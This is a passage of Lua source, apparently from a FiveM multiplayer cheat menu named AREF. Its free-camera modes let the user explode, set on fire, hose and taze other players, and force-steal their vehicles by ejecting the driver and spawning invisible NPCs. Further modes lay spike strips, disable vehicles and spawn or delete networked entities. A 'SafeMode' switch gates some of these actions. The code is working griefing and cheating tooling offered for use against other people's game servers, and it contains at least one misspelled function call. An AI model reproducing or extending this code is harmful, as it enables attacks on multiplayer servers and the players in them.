            AREF:SetIbuttons({{AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["MOUSE1"], 0), "Hydrant"}, {"b_117", "Change Mode"}})
   
    
   
            if AREF:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
   
                self:DrawBoundingBox(ent, 50, 122, 200, 50)
   
            end
   
    
   
            if IsDisabledControlJustPressed(0, AREF.Keys["MOUSE1"]) then
   
                if AREF:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
   
                    AREF:HydrantPlayer(ent)
   
                else
   
                    AREF:GetFunction("AddExplosion")(endCoords.x, endCoords.y, endCoords.z, 13, 100.0, false, false, 0.0)
   
                end
   
            end
   
        end
   
    
   
        function AREF.FreeCam:DoFire(ent, endCoords)
   
            AREF:SetIbuttons({{AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["MOUSE1"], 0), "Fire"}, {"b_117", "Change Mode"}})
   
    
   
            if AREF:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
   
                self:DrawBoundingBox(ent, 50, 122, 200, 50)
   
            end
   
    
   
            if IsDisabledControlJustPressed(0, AREF.Keys["MOUSE1"]) then
   
                if AREF:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
   
                    AREF:FirePlayer(ent)
   
                else
   
                    AREF:GetFunction("AddExplosion")(endCoords.x, endCoords.y, endCoords.z, 12, 100.0, false, false, 0.0)
   
                end
   
            end
   
        end
   
    
   
        function AREF.FreeCam:DoExplosion(ent, endCoords)
   
            AREF:SetIbuttons({{AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["MOUSE1"], 0), "Explode"}, {"b_117", "Change Mode"}})
   
    
   
            if AREF:GetFunction("DoesEntityExist")(ent) and (_is_ped_player(ent) or AREF:GetFunction("IsEntityAVehicle")(ent)) then
   
                self:DrawBoundingBox(ent, 50, 122, 200, 50)
   
            end
   
    
   
            if IsDisabledControlJustPressed(0, AREF.Keys["MOUSE1"]) then
   
                if AREF:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
   
                    AREF:GetFunction("AddExplosion")(AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 0.0), 7, 100000.0, true, false, 0.0)
   
                elseif AREF:GetFunction("DoesEntityExist")(ent) and AREF:GetFunction("IsEntityAVehicle")(ent) then
   
                    AREF:GetFunction("NetworkExplodeVehicle")(ent, true, false, false)
   
                    AREF:GetFunction("AddExplosion")(AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 0.0), 7, 100000.0, true, false, 0.0)
   
                else
   
                    AREF:GetFunction("AddExplosion")(endCoords.x, endCoords.y, endCoords.z, 7, 100000.0, true, false, 0.0)
   
                end
   
            end
   
        end
   
    
   
        local preview_spike_strip
   
        local spike_model = "p_stinger_04"
   
    
   
        function AREF.FreeCam:DoSpikeStrips(ent, endCoords)
   
            if not preview_spike_strip then
   
                preview_spike_strip = AREF:GetFunction("CreateObject")(AREF:GetFunction("GetHashKey")(spike_model), endCoords.x, endCoords.y, endCoords.z + 0.025, false, true, true)
   
            end
   
    
   
            local rot = AREF:GetFunction("GetCamRot")(self.Cam, 0)
   
            AREF:GetFunction("SetEntityCoords")(preview_spike_strip, endCoords.x, endCoords.y, endCoords.z + 0.1, false, false, false, false)
   
            AREF:GetFunction("SetEntityAlpha")(preview_spike_strip, 100)
   
            AREF:GetFunction("FreezeEntityPosition")(preview_spike_strip, true)
   
            AREF:GetFunction("SetEntityRotation")(preview_spike_strip, 0.0, 0.0, rot.z + 0.0)
   
            AREF:GetFunction("SetEntityCollision")(preview_spike_strip, false, false)
   
    
   
            if IsDisabledControlJustPressed(0, AREF.Keys["MOUSE1"]) then
   
                rot = AREF:GetFunction("GetEntityRotation")(preview_spike_strip)
   
                local spike_strip = AREF:GetFunction("CreateObject")(AREF:GetFunction("GetHashKey")(spike_model), endCoords.x, endCoords.y, endCoords.z + 0.025, true, true, true)
   
                AREF:DoNetwork(spike_strip)
   
                AREF:GetFunction("SetEntityRotation")(spike_strip, rot)
   
                AREF:GetFunction("FreezeEntityPosition")(spike_strip, true)
   
                dict.spike_ents[#dict.spike_ents + 1] = spike_strip
   
            end
   
        end
   
    
   
        function AREF.FreeCam:DoDisable(ent, endCoords)
   
            if AREF:GetFunction("IsEntityAVehicle")(ent) then
   
                if IsDisabledControlJustPressed(0, AREF.Keys["MOUSE1"]) then
   
                    AREF:DisableVehicle(ent)
   
                end
   
    
   
                self:DrawBoundingBox(ent, 50, 122, 200, 50)
   
            end
   
        end
   
    
   
        local _stealing
   
        local _stealing_ped
   
    
   
        function AREF.FreeCam:DoRCCar(ent, endCoords)
   
            AREF:SetIbuttons({{AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["LEFTSHIFT"], 0), "Invisible"}, {AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["X"], 0), "Spawn (NPC)"}, {AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["R"], 0), "Release Car (If Active)"}, {AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["MOUSE2"], 0), "Steal (NPC)"}, {AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["MOUSE1"], 0), "Steal (Force)"}, {"b_117", "Change Mode"}})
   
    
   
            if _stealing then
   
                self:DrawBoundingBox(_stealing_ped, 255, 122, 184, 50)
   
    
   
                return self:DrawBoundingBox(_stealing, 255, 120, 255, 50)
   
            end
   
    
   
            if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["R"]) and AREF.RCCar.On then
   
                AREF:AddNotification("INFO", "Released RC Car!")
   
                _stealing = nil
   
                _stealing_ped = nil
   
    
   
                return AREF:DoRCCar(false)
   
            end
   
    
   
            if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["MOUSE2"]) and self:CheckType(ent, "VEHICLE") then
   
                CreateThread(function()
   
                    _stealing = ent
   
                    local model = AREF.FreeCam.SpawnerOptions.PED[dict.math.random(1, #AREF.FreeCam.SpawnerOptions.PED)]
   
    
   
                    if not AREF:RequestModelSync(model) then
   
                        _stealing = nil
   
    
   
                        return AREF:AddNotification("Failed to steal vehicle!")
   
                    end
   
    
   
                    local c = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(_stealing, 0.0, 0.0, 0.0)
   
                    local x, y, z = c.x, c.y, c.z
   
                    local out, pos = AREF:GetFunction("GetClosestMajorVehicleNode")(x, y, z, 10.0, 0)
   
    
   
                    if not out then
   
                        pos = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(_stealing, dict.math.random(-6, 6) + 0.0, dict.math.random(-6, 6) + 0.0, 0.0)
   
                    end
   
    
   
                    local random_npc = AREF:GetFunction("CreatePed")(24, AREF:GetFunction("GetHashKey")(model), pos.x, pos.y, pos.z, 0.0, true, true)
   
                    _stealing_ped = random_npc
   
    
   
                    if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTSHIFT"]) then
   
                        AREF:GetFunction("SetEntityVisible")(random_npc, false)
   
                    end
   
    
   
                    AREF:GetFunction("SetPedAlertness")(random_npc, 0.0)
   
                    local success = AREF:StealVehicleThread(random_npc, _stealing, true)
   
                    AREF:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(random_npc, true)
   
                    AREF:GetFunction("TaskVehicleDriveWander")(random_npc, _stealing, 1000.0, 60)
   
                    local timeout = 0
   
    
   
                    if not success then
   
                        _stealing = nil
   
                        _stealing_ped = nil
   
    
   
                        return
   
                    end
   
    
   
                    while AREF:GetFunction("DoesEntityExist")(_stealing) and AREF:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc and not AREF:GetFunction("IsEntityDead")(random_npc) and timeout <= 25000 do
   
                        timeout = timeout + 10
   
                        Wait(100)
   
                    end
   
    
   
                    if AREF:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc then
   
                        _stealing = nil
   
    
   
                        return AREF:AddNotification("ERROR", "Failed to steal vehicle!")
   
                    end
   
    
   
                    AREF:DoRCCar(random_npc, _stealing)
   
                    _stealing_ped = nil
   
                    _stealing = nil
   
                end)
   
            elseif AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["MOUSE1"]) and self:CheckType(ent, "VEHICLE") then
   
                CreateThread(function()
   
                    _stealing = ent
   
                    local model = AREF.FreeCam.SpawnerOptions.PED[dict.math.random(1, #AREF.FreeCam.SpawnerOptions.PED)]
   
    
   
                    if not AREF:RequestModelSync(model) then
   
                        _stealing = nil
   
    
   
                        return AREF:AddNotification("ERROR", "Failed to steal vehicle!")
   
                    end
   
    
   
                    if AREF.Config.SafeMode then
   
                        AREF:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                    else
   
                        AREF:GetFunction("ClearPedTasksImmediately")(AREF:GetFunction("GetPedInVehicleSeat")(_stealing, -1))
   
                        local random_npc = AREF:GetFunction("CreatePedInsideVehicle")(_stealing, 24, AREF:GetFunction("GetHashKey")(model), -1, true, true)
   
    
   
                        if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTSHIFT"]) then
   
                            AREF:GetFunction("SetEntityVisible")(random_npc, false)
   
                        end
   
    
   
                        AREF:GetFunction("SetPedAlertness")(random_npc, 0.0)
   
                        AREF:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(random_npc, true)
   
                        AREF:GetFunction("TaskVehicleDriveWander")(random_npc, _stealing, 1000.0, 60)
   
                        _stealing_ped = random_npc
   
    
   
                        if AREF:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc then
   
                            _stealing = nil
   
    
   
                            return AREF:AddNotification("ERROR", "Failed to steal vehicle!")
   
                        end
   
    
   
                        AREF:DoRCCar(random_npc, _stealing)
   
                    end
   
    
   
                    _stealing_ped = nil
   
                    _stealing = nil
   
                end)
   
            elseif AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["X"]) then
   
                CreateThread(function()
   
                    local modelName = AREF:GetTextInput("Enter vehicle spawn name", "", 20)
   
                    if modelName == "" or not AREF:RequestModelSync(modelName) then return AREF:AddNotification("ERROR", "That is not a vaild vehicle model.", 10000) end
   
    
   
                    if modelName then
   
                        local car = AREF:GetFunction("CreateVehicle")(AREF:GetFunction("GetHashKey")(modelName), endCoords.x, endCoords.y, endCoords.z, dict.math.random(-360, 360) + 0.0, true, false)
   
    
   
                        if AREF:GetFunction("DoesEntityExist")(car) then
   
                            _stealing = car
   
                            local model = AREF.FreeCam.SpawnerOptions.PED[dict.math.random(1, #AREF.FreeCam.SpawnerOptions.PED)]
   
    
   
                            if not AREF:RequestModelSync(model) then
   
                                _stealing = nil
   
    
   
                                return AREF:AddNotification("ERROR", "Failed to steal vehicle!")
   
                            end
   
    
   
                            if AREF.Config.SafeMode then
   
                                AREF:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                            else
   
                                AREF:GetFunction("ClearPedTasksImmediately")(AREF:GetFunction("GetPedInVehicleSeat")(_stealing, -1))
   
                                local random_npc = AREF:GetFunction("CreatePedInsideVehicle")(_stealing, 24, AREF:GetFunction("GetHashKey")(model), -1, true, true)
   
                                AREF:GetFunction("SetPedAlertness")(random_npc, 0.0)
   
                                AREF:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(random_npc, true)
   
                                AREF:GetFunction("TaskVehicleDriveWander")(random_npc, _stealing, 1000.0, 60)
   
                                _stealing_ped = random_npc
   
    
   
                                if AREF:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc then
   
                                    _stealing = nil
   
    
   
                                    return AREF:AddNotification("ERROR", "Failed to steal vehicle!")
   
                                end
   
    
   
                                AREF:DoRCCar(random_npc, _stealing)
   
                            end
   
    
   
                            _stealing_ped = nil
   
                            _stealing = nil
   
                        end
   
                    end
   
                end)
   
            end
   
    
   
            self:DrawBoundingBox(ent, 255, 255, 120, 50)
   
            self:DrawInfoCard(ent)
   
        end
   
    
   
        function AREF.FreeCam:ManipulationLogic(cam, x, y, z)
   
            if AREF:GetFunction("UpdateOnscreenKeyboard")() ~= -1 and AREF:GetFunction("UpdateOnscreenKeyboard")() ~= 1 and AREF:GetFunction("UpdateOnscreenKeyboard")() ~= 2 then return end
   
            self:Crosshair((AREF:GetFunction("DoesEntityHaveDrawable")(self.HoveredEntity) and AREF:GetFunction("DoesEntityExist")(self.HoveredEntity)) or (AREF:GetFunction("DoesEntityHaveDrawable")(self.DraggingEntity) and AREF:GetFunction("DoesEntityExist")(self.DraggingEntity)))
   
            local rightVec, forwardVec, upVec = AREF:GetFunction("GetCamMatrix")(cam)
   
            local curVec = vector3(x, y, z)
   
            local targetVec = curVec + forwardVec * 150
   
            local handle = AREF:GetFunction("StartShapeTestRay")(curVec.x, curVec.y, curVec.z, targetVec.x, targetVec.y, targetVec.z, -1)
   
            local _, hit, endCoords, _, entity = AREF:GetFunction("GetShapeTestResult")(handle)
   
    
   
            if self.DraggingEntity and not AREF:GetFunction("DoesEntityExist")(self.DraggingEntity) then
   
                self.DraggingEntity = nil
   
                self.Rotating = nil
   
                lift_height = 0.0
   
                lift_inc = 0.1
   
    
   
                return
   
            end
   
    
   
            if AREF.Showing then return end
   
    
   
            if AREF.Config.ShowNotifications and notif_alpha > 0 then
   
                offX = _lerp(0.1, offX, 429)
   
            else
   
                offX = _lerp(0.1, offX, 0)
   
            end
   
    
   
            if not hit then
   
                endCoords = targetVec
   
            end
   
    
   
            if preview_spike_strip and AREF:GetFunction("DoesEntityExist")(preview_spike_strip) and self.Mode ~= self.Modes["SPIKE_STRIPS"] then
   
                AREF.Util:DeleteEntity(preview_spike_strip)
   
                preview_spike_strip = nil
   
            end
   
    
   
            if self:CheckType(entity, "ALL") then
   
                self.HoveredEntity = entity
   
            else
   
                self.HoveredEntity = nil
   
            end
   
    
   
            if self.Mode == self.Modes["REMOVER"] then return self:Remover(entity, "ALL") end
   
            AREF:SetIbuttons({{AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["MOUSE1"], 0), "Select"}, {"b_117", "Change Mode"}, {AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["E"], 0), "Clone"}})
   
    
   
            if self.Mode == self.Modes["PED_SPAWNER"] then
   
                self:Spawner(endCoords, GetGameplayCamRelativeHeading(), "PED")
   
            elseif self.Mode == self.Modes["OBJ_SPAWNER"] then
   
                self:Spawner(endCoords, GetGameplayCamRelativeHeading(), "OBJECT")
   
            elseif self.Mode == self.Modes["VEH_SPAWNER"] then
   
                self:Spawner(endCoords, GetGameplayCamRelativeHeading(), "VEHICLE")
   
            elseif self.Mode == self.Modes["PREMADE_SPAWNER"] then
   
                self:Spawner(endCoords, GetGameplayCamRelativeHeading(), "PREMADE")
   
            elseif self.Mode == self.Modes["SHOOT_BULLET"] then
   
                self:Spawner(endCoords, GetGameplayCamRelativeHeading(), "BULLET")
   
            elseif self.Mode == self.Modes["TELEPORT"] then
   
                AREF:SetIbuttons({{AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["MOUSE1"], 0), "Teleport"}, {"b_117", "Change Mode"}})
   
    
   
                if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["MOUSE1"]) and not AREF.Showing and hit then
   
                    AREF:GetFunction("SetEntityCoords")(AREF.LocalPlayer, endCoords.x, endCoords.y, endCoords.z, false, false, false, false)
   
                    AREF:AddNotification("INFO", "Teleported!", 2500)
   
                end
   
    
   
                return
   
            elseif self.Mode == self.Modes["RC_CAR"] then
   
                return self:DoRCCar(self.HoveredEntity, endCoords)
   
            elseif self.Mode == self.Modes["STEAL"] then
   
                return self:DoSteal(self.HoveredEntity)
   
            elseif self.Mode == self.Modes["TAZE"] then
   
                return self:DoTaze(self.HoveredEntity, endCoords)
   
            elseif self.Mode == self.Modes["HYDRANT"] then
   
                return self:DoHydrant(self.HoveredEntity, endCoords)
   
            elseif self.Mode == self.Modes["FIRE"] then
   
                return self:DoFire(self.HoveredEntity, endCoords)
   
            elseif self.Mode == self.Modes["SPIKE_STRIPS"] then
   
                return self:DoSpikeStrips(self.HoveredEntity, endCoords)
   
            elseif self.Mode == self.Modes["DISABLE_VEHICLE"] then
   
                return self:DoDisable(self.HoveredEntity, endCoords)
   
            elseif self.Mode == self.Modes["EXPLODE"] then
   
                return self:DoExplosion(self.HoveredEntity, endCoords)
   
            end
   
    
   
            if AREF:GetFunction("DoesEntityExist")(self.DraggingEntity) then
   
                if dict.frozen_ents[self.DraggingEntity] == nil then
   
                    dict.frozen_ents[self.DraggingEntity] = true
   
                end
   
    
   
                if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["DELETE"]) and not AREF.Showing then
   
                    if self.DraggingEntity == AREF.LocalPlayer then return AREF:AddNotification("ERROR", "You can not delete yourself!", 10000) end
   
                    if _is_ped_player(self.DraggingEntity) then return AREF:AddNotification("ERROR", "You can not delete players!", 10000) end
   
                    self:DrawBoundingBox(self.DraggingEntity, 255, 50, 50, 50)
   
                    AREF:AddNotification("INFO", "Deleted " .. ("<font color='#%s'>%s</font>"):format(AREF.TertiaryHex, dict.tostring(self.DraggingEntity)), 10000)
   
                    AREF.Util:DeleteEntity(self.DraggingEntity)
   
                    self.DraggingEntity = nil
   
                    lift_height = 0.0
   
                    lift_inc = 0.1
   
                    self.Rotating = nil
   
    
   
                    return
   
                end
   
    
   
                if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["E"]) then
   
                    self:Clone(self.DraggingEntity)
   
                end
   
    
   
                if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["MOUSE2"]) and not AREF.Showing then
   
                    local data = self.DraggingData
   
    
   
                    if data then
   
                        AREF:GetFunction("SetEntityCoords")(self.DraggingEntity, data.Position.x, data.Position.y, data.Position.z, false, false, false, false)
   
                        AREF:GetFunction("SetEntityRotation")(self.DraggingEntity, data.Rotation.x, data.Rotation.y, data.Rotation.z)
   
                    end
   
    
   
                    self.DraggingEntity = nil
   
                    lift_height = 0.0
   
                    lift_inc = 0.1
   
                    self.Rotating = nil
   
    
   
                    return
   
                elseif AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["MOUSE1"]) and not AREF.Showing then
   
                    self.DraggingEntity = nil
   
                    lift_height = 0.0
   
                    lift_inc = 0.1
   
                    self.Rotating = nil
   
    
   
                    return
   
                end
   
    
   
                if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["R"]) and not AREF.Showing then
   
                    self.Rotating = not self.Rotating
   
                    local rot = AREF:GetFunction("GetEntityRotation")(self.DraggingEntity)
   
                    rotP, rotY, rotR = rot.x, rot.y, rot.z
   
                end
   
    
   
                if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["LEFTALT"]) and not self.Rotating then
   
                    dict.frozen_ents[self.DraggingEntity] = not dict.frozen_ents[self.DraggingEntity]
   
                end
   
    
   
                AREF:GetFunction("FreezeEntityPosition")(self.DraggingEntity, dict.frozen_ents[entity])
   
    
   
                if self.Rotating and not AREF.Showing then
   
                    self:DrawBoundingBox(self.DraggingEntity, 255, 125, 50, 50)
   
                    AREF:SetIbuttons({{AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["R"], 0), "Exit Rotate Mode"}, {AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["MOUSE2"], 0), "Reset Position"}, {AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["MOUSE1"], 0), "Stop Dragging"}, {AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["LEFTSHIFT"], 0), "Snap Nearest 45 Degrees"}, {AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["LEFTALT"], 0), "Increment x" .. (AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTALT"]) and 1.0 or 15.0)}, {"t_D%t_A", "Roll"}, {"t_W%t_S", "Pitch"}, {"b_2000%t_X", "Yaw"}})
   
    
   
                    if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["D"]) then
   
                        rotR = rotR + (AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTALT"]) and 1.0 or 15.0)
   
    
   
                        if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTSHIFT"]) then
   
                            rotR = _snap(rotR)
   
                        end
   
                    end
   
    
   
                    if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["A"]) then
   
                        rotR = rotR - (AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTALT"]) and 1.0 or 15.0)
   
    
   
                        if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTSHIFT"]) then
   
                            rotR = _snap(rotR)
   
                        end
   
                    end
   
    
   
                    if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["W"]) then
   
                        rotP = rotP - (AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTALT"]) and 1.0 or 15.0)
   
    
   
                        if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTSHIFT"]) then
   
                            rotP = _snap(rotP)
   
                        end
   
                    end
   
    
   
                    if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["S"]) then
   
                        rotP = rotP + (AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTALT"]) and 1.0 or 15.0)
   
    
   
                        if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTSHIFT"]) then
   
                            rotP = _snap(rotP)
   
                        end
   
                    end
   
    
   
                    if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["SPACE"]) then
   
                        rotY = rotY - (AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTALT"]) and 1.0 or 15.0)
   
    
   
                        if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTSHIFT"]) then
   
                            rotY = _snap(rotY)
   
                        end
   
                    end
   
    
   
                    if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["X"]) then
   
                        rotY = rotY + (AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTALT"]) and 1.0 or 15.0)
   
    
   
                        if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTSHIFT"]) then
   
                            rotY = _snap(rotY)
   
                        end
   
                    end
   
    
   
                    AREF:GetFunction("SetEntityRotation")(self.DraggingEntity, rotP + 0.0, rotY + 0.0, rotR + 0.0)
   
                    self:DrawInfoCard(self.DraggingEntity)
   
    
   
                    return AREF:GetFunction("NetworkRequestControlOfEntity")(self.DraggingEntity)
   
                end
   
    
   
                local handleTrace = AREF:GetFunction("StartShapeTestRay")(curVec.x, curVec.y, curVec.z, targetVec.x, targetVec.y, targetVec.z, -1, self.DraggingEntity)
   
                local _, hit, endPos, _, _ = AREF:GetFunction("GetShapeTestResult")(handleTrace)
   
                local c = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(self.DraggingEntity, 0.0, 0.0, 0.0)
   
                local cX, cY, cZ = c.x, c.y, c.z
   
                local cam_rot = AREF:GetFunction("GetCamRot")(self.Cam, 0)
   
                local rot = AREF:GetFunction("GetEntityRotation")(self.DraggingEntity)
   
                AREF:GetFunction("SetEntityRotation")(self.DraggingEntity, rot.x, rot.y, cam_rot.z + 0.0)
   
    
   
                if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["MWHEELDOWN"]) then
   
                    lift_inc = lift_inc + 0.01
   
    
   
                    if lift_inc <= 0.01 then
   
                        lift_inc = 0.01
   
                    elseif lift_inc >= 3 then
   
                        lift_inc = 3
   
                    end
   
                end
   
    
   
                if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["MWHEELUP"]) then
   
                    lift_inc = lift_inc - 0.01
   
    
   
                    if lift_inc <= 0.01 then
   
                        lift_inc = 0.01
   
                    elseif lift_inc >= 3 then
   
                        lift_inc = 3
   
                    end
   
                end
   
    
   
                if AREF:GetFunction("IsDisabledControlPessed")(0, AREF.Keys["C"]) then
   
                    lift_height = lift_height + lift_inc
   
                end
   
    
   
                if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["Z"]) then
   
                    lift_height = lift_height - lift_inc
   
                end
   
    
   
                if hit then
   
                    AREF:GetFunction("SetEntityCoords")(self.DraggingEntity, endPos.x, endPos.y, endPos.z + lift_height, false, false, false, false)
   
                    self:DrawBoundingBox(self.DraggingEntity, 50, 255, 50, 50)
   
                else
   
                    AREF:GetFunction("SetEntityCoords")(self.DraggingEntity, targetVec.x, targetVec.y, targetVec.z + lift_height, false, false, false, false)
   
                    self:DrawBoundingBox(self.DraggingEntity, 50, 255, 50, 50)
   
                end
   
    
   
                self:DrawInfoCard(self.DraggingEntity)
   
                AREF:SetIbuttons({{AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["C"], 0), "Lift Up (+" .. lift_inc .. ")"}, {AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["Z"], 0), "Push Down (-" .. lift_inc .. ")"}, {AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["R"], 0), "Rotate"}, {AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["LEFTALT"], 0), "Toggle Frozen"}, {AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["MOUSE2"], 0), "Reset Position"}, {AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["MOUSE1"], 0), "Stop Dragging"}, {AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["E"], 0), "Clone"}})
   
    
   
                return AREF:GetFunction("NetworkRequestControlOfEntity")(self.DraggingEntity)
   
            end
   
    
   
            local ent = AREF:GetFunction("DoesEntityExist")(self.DraggingEntity) and self.DraggingEntity or self.HoveredEntity
   
    
   
            if AREF:GetFunction("DoesEntityExist")(ent) and AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["E"]) then
   
                self:Clone(ent)
   
            end
   
    
   
            if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["LEFTSHIFT"]) or beginning_target ~= nil then return self:PedTarget(cam, x, y, z) end
   
    
   
            if AREF:GetFunction("DoesEntityExist")(self.HoveredEntity) and AREF:GetFunction("DoesEntityHaveDrawable")(self.HoveredEntity) and not AREF:GetFunction("DoesEntityExist")(self.DraggingEntity) then
   
                if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["MOUSE1"]) and not AREF.Showing and not _is_ped_player(self.HoveredEntity) then
   
                    self.DraggingEntity = self.HoveredEntity
   
    
   
                    self.DraggingData = {
   
                        Position = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(self.HoveredEntity, 0.0, 0.0, 0.0),
   
                        Rotation = AREF:GetFunction("GetEntityRotation")(self.HoveredEntity)
   
                    }
   
                else
   
                    self:DrawBoundingBox(self.HoveredEntity, 255, 255, 255, 50)
   
                    self:DrawInfoCard(self.HoveredEntity)
   
                end
   
            end
   
        end
   
    
   
        function AREF.FreeCam:DisableMovement(off)
   
            AREF:GetFunction("DisableControlAction")(1, 30, off)
   
            AREF:GetFunction("DisableControlAction")(1, 31, off)
   
            AREF:GetFunction("DisableControlAction")(1, 32, off)
   
            AREF:GetFunction("DisableControlAction")(1, 33, off)
   
            AREF:GetFunction("DisableControlAction")(1, 34, off)
   
            AREF:GetFunction("DisableControlAction")(1, 35, off)
   
            AREF:GetFunction("DisableControlAction")(1, 36, off)
   
            AREF:GetFunction("DisableControlAction")(1, 37, off)
   
            AREF:GetFunction("DisableControlAction")(1, 38, off)
   
            AREF:GetFunction("DisableControlAction")(1, 44, off)
   
            AREF:GetFunction("DisableControlAction")(1, 45, off)
   
            AREF:GetFunction("DisableControlAction")(0, 63, off)
   
            AREF:GetFunction("DisableControlAction")(0, 64, off)
   
            AREF:GetFunction("DisableControlAction")(0, 71, off)
   
            AREF:GetFunction("DisableControlAction")(0, 72, off)
   
            AREF:GetFunction("DisableControlAction")(0, 75, off)
   
            AREF:GetFunction("DisableControlAction")(0, 278, off)
   
            AREF:GetFunction("DisableControlAction")(0, 279, off)
   
            AREF:GetFunction("DisableControlAction")(0, 280, off)
   
            AREF:GetFunction("DisableControlAction")(0, 281, off)
   
            AREF:GetFunction("DisablePlayerFiring")(AREF.NetworkID, off)
   
            AREF:GetFunction("DisableControlAction")(0, 24, off)
   
            AREF:GetFunction("DisableControlAction")(0, 25, off)
   
            AREF:GetFunction("DisableControlAction")(1, 37, off)
   
            AREF:GetFunction("DisableControlAction")(0, 47, off)
   
            AREF:GetFunction("DisableControlAction")(0, 58, off)
   
            AREF:GetFunction("DisableControlAction")(0, 140, off)
   
            AREF:GetFunction("DisableControlAction")(0, 141, off)
   
            AREF:GetFunction("DisableControlAction")(0, 81, off)
   
            AREF:GetFunction("DisableControlAction")(0, 82, off)
   
            AREF:GetFunction("DisableControlAction")(0, 83, off)
   
            AREF:GetFunction("DisableControlAction")(0, 84, off)
   
            AREF:GetFunction("DisableControlAction")(0, 12, off)
   
            AREF:GetFunction("DisableControlAction")(0, 13, off)
   
            AREF:GetFunction("DisableControlAction")(0, 14, off)
   
            AREF:GetFunction("DisableControlAction")(0, 15, off)
   
            AREF:GetFunction("DisableControlAction")(0, 24, off)
   
            AREF:GetFunction("DisableControlAction")(0, 16, off)
   
            AREF:GetFunction("DisableControlAction")(0, 17, off)
   
            AREF:GetFunction("DisableControlAction")(0, 96, off)
   
            AREF:GetFunction("DisableControlAction")(0, 97, off)
   
            AREF:GetFunction("DisableControlAction")(0, 98, off)
   
            AREF:GetFunction("DisableControlAction")(0, 96, off)
   
            AREF:GetFunction("DisableControlAction")(0, 99, off)
   
